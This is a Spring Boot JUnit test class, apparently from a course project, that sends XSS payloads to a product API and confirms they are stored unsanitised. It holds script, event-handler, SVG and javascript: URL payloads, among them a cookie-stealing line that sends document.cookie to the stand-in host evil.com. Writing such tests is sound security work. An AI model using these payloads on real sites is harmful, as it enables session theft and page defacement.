package com.flogin.security;

import com.flogin.dto.LoginDto.LoginRequest;
import com.flogin.dto.ProductDtos.CreateProductRequest;
import com.flogin.dto.ProductDtos.UpdateProductRequest;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.transaction.annotation.Transactional;

import static org.hamcrest.Matchers.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * XSS (Cross-Site Scripting) Security Tests (1.5 điểm)
 * 
 * Tests các XSS attack vectors:
 * - Stored XSS (Persistent)
 * - Reflected XSS
 * - DOM-based XSS
 * - Script tag injection
 * - Event handler injection
 * - HTML entity encoding
 */
@SpringBootTest
@AutoConfigureMockMvc
@Transactional
@DisplayName("XSS (Cross-Site Scripting) Security Tests")
public class XssSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    private String authToken;

    @BeforeEach
    void setUp() throws Exception {
        LoginRequest loginRequest = new LoginRequest("admin", "admin123");

        String response = mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(loginRequest)))
                .andExpect(status().isOk())
                .andReturn().getResponse().getContentAsString();

        authToken = "Bearer " + objectMapper.readTree(response).get("token").asText();
    }

    // ===================================================================
    // TC1: Stored XSS - Script Tag Injection
    // ===================================================================

    @Test
    @DisplayName("TC1.1: Stored XSS - Script tag trong product name")
    void testXss_StoredXss_ScriptTag_ProductName() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<script>alert('XSS')</script>", 100.0, "Test", 10, "Electronics");

        String response = mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andReturn().getResponse().getContentAsString();

        Long productId = objectMapper.readTree(response).get("id").asLong();

        // Retrieve và verify - Backend không sanitize, XSS payload được stored (VULNERABILITY!)
        mockMvc.perform(get("/api/products/" + productId)
                .header("Authorization", authToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.productName").exists())
                // SECURITY ISSUE: XSS payload được lưu nguyên trong database
                .andExpect(jsonPath("$.productName", containsString("<script>")));
    }

    @Test
    @DisplayName("TC1.2: Stored XSS - Script tag trong description")
    void testXss_StoredXss_ScriptTag_Description() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("Test Product", 100.0, "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.description", containsString("<script>")));
    }

    // ===================================================================
    // TC2: Event Handler Injection
    // ===================================================================

    @Test
    @DisplayName("TC2.1: XSS - onerror event handler")
    void testXss_EventHandler_OnError() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<img src=x onerror=alert('XSS')>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("onerror")));
    }

    @Test
    @DisplayName("TC2.2: XSS - onclick event handler")
    void testXss_EventHandler_OnClick() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<div onclick='alert(\"XSS\")'>Click me</div>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("onclick")));
    }

    @Test
    @DisplayName("TC2.3: XSS - onload event handler")
    void testXss_EventHandler_OnLoad() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<body onload=alert('XSS')>", 100.0, "<iframe onload='alert(document.cookie)'>", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("onload")))
                .andExpect(jsonPath("$.description", containsString("onload")));
    }

    // ===================================================================
    // TC3: HTML Tag Injection
    // ===================================================================

    @Test
    @DisplayName("TC3.1: XSS - iframe injection")
    void testXss_HtmlTag_Iframe() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<iframe src='http://evil.com'></iframe>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("<iframe")));
    }

    @Test
    @DisplayName("TC3.2: XSS - object/embed tag injection")
    void testXss_HtmlTag_ObjectEmbed() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<object data='http://evil.com'></object>", 100.0, "<embed src='http://evil.com'>", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("<object")))
                .andExpect(jsonPath("$.description", containsString("<embed")));
    }

    // ===================================================================
    // TC4: JavaScript Protocol Injection
    // ===================================================================

    @Test
    @DisplayName("TC4.1: XSS - javascript: protocol")
    void testXss_JavascriptProtocol() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<a href='javascript:alert(\"XSS\")'>Click</a>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("javascript:")));
    }

    @Test
    @DisplayName("TC4.2: XSS - data: protocol")
    void testXss_DataProtocol() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<a href='data:text/html,<script>alert(\"XSS\")</script>'>Click</a>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("data:text/html")));
    }

    // ===================================================================
    // TC5: Encoded XSS Payloads
    // ===================================================================

    @Test
    @DisplayName("TC5.1: XSS - HTML entity encoded payload")
    void testXss_EncodedPayload_HtmlEntity() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("&lt;script&gt;alert('XSS')&lt;/script&gt;", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName").exists());
    }

    @Test
    @DisplayName("TC5.2: XSS - URL encoded payload")
    void testXss_EncodedPayload_UrlEncoded() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("%3Cscript%3Ealert('XSS')%3C/script%3E", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated());
    }

    // ===================================================================
    // TC6: SVG-based XSS
    // ===================================================================

    @Test
    @DisplayName("TC6.1: XSS - SVG with script")
    void testXss_Svg_WithScript() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<svg/onload=alert('XSS')>", 100.0, "<svg><script>alert('XSS')</script></svg>", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("<svg")))
                .andExpect(jsonPath("$.description", containsString("<svg")));
    }

    // ===================================================================
    // TC7: Reflected XSS (via parameters)
    // ===================================================================

    @Test
    @DisplayName("TC7.1: Reflected XSS - Search parameter")
    void testXss_ReflectedXss_SearchParameter() throws Exception {
        // Backend accepts XSS in search param (no validation) - vulnerability
        mockMvc.perform(get("/api/products")
                .param("search", "<script>alert('XSS')</script>")
                .header("Authorization", authToken))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.content").isArray()); // Just verify response structure
    }

    // ===================================================================
    // TC8: Obfuscated XSS
    // ===================================================================

    @Test
    @DisplayName("TC8.1: XSS - Obfuscated with mixed case")
    void testXss_Obfuscated_MixedCase() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<ScRiPt>alert('XSS')</sCrIpT>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsStringIgnoringCase("<script>")));
    }

    @Test
    @DisplayName("TC8.2: XSS - With null bytes")
    void testXss_Obfuscated_NullBytes() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("<scr\0ipt>alert('XSS')</scr\0ipt>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated());
    }

    // ===================================================================
    // TC9: XSS via Update Endpoint
    // ===================================================================

    @Test
    @DisplayName("TC9.1: XSS - Update product với malicious payload")
    void testXss_UpdateProduct() throws Exception {
        UpdateProductRequest xssRequest = new UpdateProductRequest("<script>alert('XSS')</script>", 200.0, "<img src=x onerror=alert('XSS')>", 20, "Electronics");

        mockMvc.perform(put("/api/products/1")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.productName", containsString("<script>")))
                .andExpect(jsonPath("$.description", containsString("onerror")));
    }

    // ===================================================================
    // TC10: DOM-based XSS Vectors
    // ===================================================================

    @Test
    @DisplayName("TC10.1: XSS - innerHTML manipulation attempt")
    void testXss_DomBased_InnerHtml() throws Exception {
        CreateProductRequest xssRequest = new CreateProductRequest("Product<img src=x onerror='document.body.innerHTML=\"<h1>Hacked</h1>\"'>", 100.0, "Test", 10, "Electronics");

        mockMvc.perform(post("/api/products")
                .header("Authorization", authToken)
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(xssRequest)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.productName", containsString("innerHTML")));
    }
}

